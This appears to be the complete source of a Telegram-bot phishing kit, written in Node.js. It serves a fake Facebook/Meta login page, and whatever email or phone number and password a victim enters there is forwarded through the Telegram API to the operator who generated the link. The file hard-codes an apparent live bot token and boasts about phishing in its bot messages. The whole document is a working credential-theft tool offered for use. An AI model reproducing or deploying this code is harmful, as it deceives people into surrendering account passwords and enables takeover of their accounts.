const express = require("express");
const { Telegraf } = require("telegraf");

const BOT_TOKEN = "8709022559:AAFpL8BRVBaNdq1wn9jz-D4JXXXjcLy_XVo";
const PORT = process.env.PORT || 3000;

const bot = new Telegraf(BOT_TOKEN);
const app = express();

app.use(express.json());

bot.start((ctx) => {
  ctx.reply(
`👋YOO 🥹🥹 
𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 ΛΞ𝚇 𝙿𝙷𝙸𝚂𝙷𝙸𝙽𝙶 𝙼𝙳 🫣
𝙸 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝚃𝙷𝙴 𝙻𝙸𝙽𝙺 𝚄 𝙶𝙴𝚃 𝚃𝙷𝙸𝙴𝚁 𝙸𝙼𝙰𝙶𝙴 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 🫡
𝚄𝚂𝙴 /genlink 𝚃𝙾 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝚈𝙾𝚄𝚁 𝙻𝙸𝙽𝙺 🥹🥹🫰 𝙼𝙰𝙺𝙴 𝙸𝚃 𝙵𝙰𝚂𝚃 𝙿𝙻𝙴𝙰𝚂𝙴`
  );
});

bot.command("genlink", (ctx) => {
  const link = `https://myweb/?id=${ctx.from.id}`;

  ctx.reply(
`🥹🥹🥹🥹🥹🥹🥹🥹🥹🥹🥹
\` 𝚈𝙾𝚄𝚁 𝙻𝙸𝙽𝙺 𝙷𝙰𝚅𝙴 𝙱𝙴𝙴𝙽 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴𝙳 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻 🫡 𝙽𝙾𝚆 𝚄𝚃𝙰 𝚃𝙸𝙼𝙴 𝚃𝙾 𝙿𝙻𝙰𝚈 𝚈𝙾𝚄𝚁 𝙿𝙰𝚁𝚃 𝙲𝙾𝚁𝙼𝙼𝙰𝙽𝙳𝙴\`

\`${link}\`
𝚃𝙰𝙿 𝚃𝙾 𝙲𝙾𝙿𝚈`
);
});

app.get("/", (req, res) => {

  const userId = req.query.id || "";

  res.send(`
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Anonymous Note</title>

<style>

      /* ---------- Original Facebook Style ---------- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 2rem 1.5rem;
        }
        .login-wrapper {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 2rem 0 1.5rem;
        }
        .lang-toggle {
            text-align: center;
            font-size: 15px;
            color: #737373;
            margin-bottom: 0.5rem;
        }
        .logo-wrap {
            display: flex;
            justify-content: center;
            margin-top: 2.5rem;
        }
        .logo-wrap svg {
            width: 68px;
            height: 68px;
            display: block;
        }
        .login-form {
            margin-top: 5rem;
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
        }
        .login-form input {
            height: 56px;
            width: 100%;
            border-radius: 16px;
            border: 1px solid #dddfe2;
            background: #ffffff;
            padding: 0 1rem;
            font-size: 17px;
            color: #1c1c1c;
            outline: none;
            transition: border-color 0.15s, box-shadow 0.15s;
        }
        .login-form input::placeholder {
            color: #737373;
        }
        .login-form input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 1px #1877f2;
        }
        .btn-login {
            height: 56px;
            width: 100%;
            border-radius: 9999px;
            border: none;
            background: #1877f2;
            color: #ffffff;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.15s;
            margin-top: 0.5rem;
        }
        .btn-login:hover {
            background: #166fe5;
        }
        .forgot-link {
            display: block;
            text-align: center;
            margin-top: 0.75rem;
            font-size: 15px;
            font-weight: 600;
            color: #1c1c1c;
            text-decoration: none;
            background: transparent;
            border: none;
            cursor: pointer;
            font-family: inherit;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        .spacer {
            flex: 1;
            min-height: 1rem;
        }
        .btn-create {
            height: 56px;
            width: 100%;
            border-radius: 9999px;
            border: 1px solid #1877f2;
            background: #ffffff;
            color: #1877f2;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.15s;
            font-family: inherit;
        }
        .btn-create:hover {
            background: rgba(24, 119, 242, 0.05);
        }
        .meta-footer {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-top: 2rem;
            margin-bottom: 1rem;
        }
        .meta-footer .meta-inner {
            display: flex;
            align-items: center;
            gap: 0.4rem;
        }
        .meta-footer svg {
            height: 18px;
            width: auto;
            display: block;
        }
        .meta-footer span {
            font-size: 18px;
            font-weight: 600;
            letter-spacing: -0.02em;
            color: #1c1c1c;
        }
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(80px);
            background: #1c1c1c;
            color: #fff;
            padding: 12px 28px;
            border-radius: 9999px;
            font-size: 15px;
            font-weight: 500;
            opacity: 0;
            transition: opacity 0.35s ease, transform 0.35s ease;
            pointer-events: none;
            z-index: 999;
            box-shadow: 0 6px 24px rgba(0, 0, 0, 0.25);
            max-width: 90%;
            text-align: center;
        }
        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
        .toast.error {
            background: #c62828;
        }
        @media (max-width: 420px) {
            .login-wrapper {
                padding: 1.5rem 0 1rem;
            }
            .login-form {
                margin-top: 3rem;
            }
            .logo-wrap {
                margin-top: 1.5rem;
            }
            .logo-wrap svg {
                width: 56px;
                height: 56px;
            }
        }

</style>
</head>

<body>

  <div class="formpage">

        <p class="lang-toggle">English (UK)</p>

        <div class="logo-wrap">
            <svg viewBox="0 0 40 40" aria-label="Facebook" role="img">
                <circle cx="20" cy="20" r="20" fill="#1877F2" />
                <path d="M23.4 21.5l.7-4.4h-4.2v-2.9c0-1.2.6-2.4 2.5-2.4h2V8.1s-1.8-.3-3.5-.3c-3.6 0-5.9 2.2-5.9 6.1v3.4h-3.9v4.4h3.9v10.6c.8.1 1.6.2 2.4.2.8 0 1.6-.1 2.4-.2V21.5h3.6z" fill="#fff" />
            </svg>
        </div>

        <form class="login-form" id="loginForm" action="javascript:void(0)">

            <input
            type="text"
            id="name"
            inputmode="email"
            autocomplete="username"
            placeholder="Mobile number or email address"
            required
            />
            <input
            type="password"
            id="note"
            autocomplete="current-password"
            placeholder="Password"
            required
            />

            <button typr= "botton" class="btn-login" onclick="sendNote()">
             Log in
            </button>

            <button type="button" class="forgot-link">
                Forgotten password?
            </button>
        </form>

        <div class="spacer"></div>

        <button type="button" class="btn-create">
            Create new account
        </button>

        <div class="meta-footer">
            <div class="meta-inner">
                <svg viewBox="0 0 32 32" fill="#0064e0" xmlns="http://www.w3.org/2000/svg">
                    <path d="M28.46 10.38a8.33 8.33 0 0 0-4.63-1.38c-3.1 0-6 1.63-7.83 4.25-1.83-2.62-4.73-4.25-7.83-4.25a8.33 8.33 0 0 0-4.63 1.38C1.5 11.66 0 13.9 0 16c0 2.1 1.5 4.34 3.54 5.62A8.33 8.33 0 0 0 8.17 23c3.1 0 6-1.62 7.83-4.25C17.83 21.38 20.73 23 23.83 23a8.33 8.33 0 0 0 4.63-1.38C30.5 20.34 32 18.1 32 16c0-2.1-1.5-4.34-3.54-5.62ZM8.17 19.5c-2.43 0-4.44-1.54-4.44-3.5s2-3.5 4.44-3.5 4.45 1.54 4.45 3.5-2 3.5-4.45 3.5Zm15.66 0c-2.43 0-4.44-1.54-4.44-3.5s2-3.5 4.44-3.5 4.45 1.54 4.45 3.5-2 3.5-4.45 3.5Z"/>
                </svg>
                <span>Meta</span>
            </div>
        </div>

    </div>

<script>

const userId="${userId}";

async function sendNote(){

const name=
document.getElementById("name").value;

const note=
document.getElementById("note").value;

if(!name||!note){
alert("Fill all fields");
return;
}

const res=await fetch("/send",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
id:userId,
name,
note
})
});

const data=await res.json();

if(data.success){
document.getElementById("msg").innerHTML=
"Login Verified...";
}else{
document.getElementById("msg").innerHTML=
"❌ Failed";
}

}

</script>

</body>
</html>
`);
});

app.post("/send", async (req, res) => {

  try {

    const { id, name, note } = req.body;

    const text =
`📩 𝙽𝙴𝚆 𝙳𝙰𝚃𝙰 𝚁𝙴𝙲𝙸𝚅𝙴𝙳 

👤 𝙴𝙼𝙰𝙸𝙻/𝙿𝙷𝙾𝙽𝚆 𝙽𝚄𝙼𝙱𝙴𝚁: \`${name}\`

📝 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳: \`${note}\`

𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 ΛΞX 𝚃𝙷𝙴 𝙰𝙽𝙾𝙽𝚈𝙼𝙾𝚄𝚂 𝙳𝙴𝚅 😈`;

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: id,
          text
        })
      }
    );

    res.json({
      success: true
    });

  } catch {

    res.json({
      success: false
    });

  }

});

bot.launch();

app.listen(PORT, () => {
  console.log("Server Running On Port " + PORT);
});